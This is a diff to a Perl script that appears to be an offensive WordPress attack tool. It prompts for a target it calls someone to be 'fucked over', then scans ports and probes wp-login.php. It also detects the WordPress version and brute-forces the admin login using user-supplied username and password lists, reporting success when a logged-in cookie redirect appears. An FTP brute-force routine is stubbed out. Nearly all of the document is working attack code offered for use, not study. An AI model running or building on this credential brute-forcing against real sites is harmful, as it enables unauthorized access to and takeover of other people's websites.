@@ -6,6 +6,12 @@
 #
 ########
 
+################Version 1.0###################
+#
+# Currently works with basic information gathering and basic brute forcing
+#
+
+
 
 ############################
 #Built-in modules
@@ -38,6 +44,8 @@ my $banner = << 'EOL';
 |   |  Y Y  \  |  | |   Y  \  ___/  /\__|    |  |  / /_/  > /_/  >  ___/|  | \/   |  \/ __ \|  |  /|  |    |    |   \   | |    |   \     \___\    Y    /
 |___|__|_|  /  |__| |___|  /\___  > \________|____/\___  /\___  / \___  >__|  |___|  (____  /____/ |__|    |______  /___| |____|    \______  /\___|_  /
           \/             \/     \/                /_____//_____/      \/           \/     \/                      \/                       \/       \/
+
+VERSION 1.0
 ++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
 EOL
 #####################################
@@ -51,18 +59,30 @@ $bot -> cookie_jar($cookie);
 print color('bold yellow');
 print $banner;
 print "\n\n[*]Who we fucking over => ";
-print color('reset');
 print color('bold red');
 chomp(my $host = <STDIN>);
-#print "\n\n[*]Enter the path to the list of usernames => ";
-#chomp(my $user = <STDIN>);
-#print "\n\n[*]Enter the path to the list of passwords => ";
-#chomp(my $pass = <STDIN>);
-print color('reset');
+print color('bold yellow');
+print "\n\n[*]Enter the path to the list of usernames => ";
+print color('bold red');
+chomp(my $usernames = <STDIN>);
+print color('bold yellow');
+print "\n\n[*]Enter the path to the list of passwords => ";
+print color('bold red');
+chomp(my $passwords = <STDIN>);
+#####################################
+#Reading user provided files and pushing them to gloabl arrays, will add error handling soon
+open my $user_handle, '<', $usernames;
+chomp(my @users = <$user_handle>);
+close $user_handle;
+
+open my $pass_handle, '<', $passwords;
+chomp(my @pass = <$pass_handle>);
+close $pass_handle;
 #####################################
 #Running subroutines
 port_scanner();
 admin_find();
+version_find();
 user_find();
 #####################################
 #Start subroutine building
@@ -99,33 +119,28 @@ sub admin_find {
  print "++++++++++++++++++++++++++++++++++\n";
  print color('reset');
 #array of typical admin pages
- my @admins = qw(admin administrator wp-admin wp-login.php);
   if ($host !~ /http:\/\//) {$host = "http://$host";}; #adds http before the target if it is not present
-  foreach my $admin (@admins) {
-	 my $hunt = $host."/".$admin."/";
-	 my $req = HTTP::Request->new(GET=>$hunt); #sends a GET request for the pages
-	 my $res = $bot->request($req);
-    #looks for the admin page
-   if ($res->is_success) {
-      print color('bold green');
-	    print "[*]Found the admin page!!\n";
-	    print "[*] =>\t$hunt \n";
-      print color('reset');
-      last;
+  my $hunt = $host."/wp-login.php/";
+	my $req = HTTP::Request->new(GET=>$hunt); #sends a GET request for the pages
+	my $res = $bot->request($req);
+   #looks for the admin page
+  if ($res->is_success) {
+     print color('bold green');
+	   print "[*]Found the admin page!!\n";
+	   print "[*] =>\t$hunt \n";
+     print color('reset');
+   }
+	 elsif ($res->content=~/Access Denied/){ #if the admin page is found, but pulls a 403 error, will let the user know
+     print color('bold green');
+     print "[*]Found the admin page : $hunt => [Error & Access Denied]\n";
+     print color('reset');
     }
-	  elsif ($res->content=~/Access Denied/){ #if the admin page is found, but pulls a 403 error, will let the user know
-      print color('bold green');
-      print "[*]Found the admin page : $hunt => [Error & Access Denied]\n";
-      print color('reset');
-      last;
-	  }
-	  else {
-      print color('red');
-      print "[*]Unable to find an admin page\n";
-      print color('reset');
+	 else {
+     print color('red');
+     print "[*]Unable to find an admin page\n";
+     print color('reset');
 	  }
   }
-}
 
 ####
 #WordPress user discovery
@@ -148,20 +163,39 @@ sub user_find {
   }
   else{
     print color('red');
-    print "[*]Unable to find a user\n[*]Using user provided username list\n";
+    print "[*]Unable to find a user\n[*]Using user provided username list\n"; #needs to be built out
     print color('reset');
   }
 }
 
 ####
 #Version discovery
-sub version_find {}
+sub version_find {
+  print color('bold yellow');
+  print "++++++++++++++++++++++++++++++++++\n";
+  print "[*]Looking for WordPress Version\n";
+  print "++++++++++++++++++++++++++++++++++\n";
+  print color('reset');
+  my $req = HTTP::Request -> new(GET=>$host);
+  my $versionfind = $bot ->request($req)->content;
+  if($versionfind =~ /content="WordPress(.*?)"/){
+    my $version = $1;
+    print color('bold green');
+    print "[*]Found version\n";
+    print "[*] =>\t$version \n";
+    print color('reset');
+  }
+  else {
+    print color('red');
+    print "[*]Unable to determine the WordPress Version\n";
+    print color('reset');
+  }
+}
 
 ####
 #Admin Page Brute force
 sub brute_force {
   my $victim = shift; #Sets the variable up allow input
-  my @passwds = qw(password 123 admin admin123 BTekgFutvcx1L%9pbN); #support for file reading coming soon
   print color('bold yellow');
   print "++++++++++++++++++++++++++++++++++\n";
   print "[*]Trying to break the Admin login\n";
@@ -169,14 +203,14 @@ sub brute_force {
   print color('reset');
   #Iterating through the array to try and guess the password
   #Attempts to find a redirect between the login script and the actual admin page
-  foreach (@passwds) {
+  foreach (@pass) {
       chomp(my $passwd = $_);
         my $target = $host . '/wp-login.php';
         my $auth = $host . '/wp-admin/';
         my $login = POST $target,[log => $victim, pwd => $passwd, wpsubmit=> 'Log In', redirect_to => $auth]; #builds a POST request for the login page
         my $attempt = $bot->request($login); #sends the actual request
         my $status = $attempt-> as_string; #Converts the data from the HASH that the request sends to a STRING
-        if (($status =~ /Location:/) && ($status =~ /wordpress_logged_in/)){ #checks if the redirect has occurred
+      if (($status =~ /Location:/) && ($status =~ /wordpress_logged_in/)){ #checks if the redirect has occurred
           print color('bold green');
           print "[*]Broke the site!\n";
           print "[*] =>\t$victim \n";
@@ -187,14 +221,6 @@ sub brute_force {
   }
 
 ####
-#Database discovery
-sub db_find {}
-
-####
-#Database interaction
-sub db_int {}
-
-####
 #FTP brute forcing
 sub ftp_brute {
   print color('bold yellow');
@@ -202,6 +228,10 @@ sub ftp_brute {
   print "[*]Trying to break the FTP login\n";
   print "++++++++++++++++++++++++++++++++++\n";
   print color('reset');
+
+
+
+
 }
 
 ####
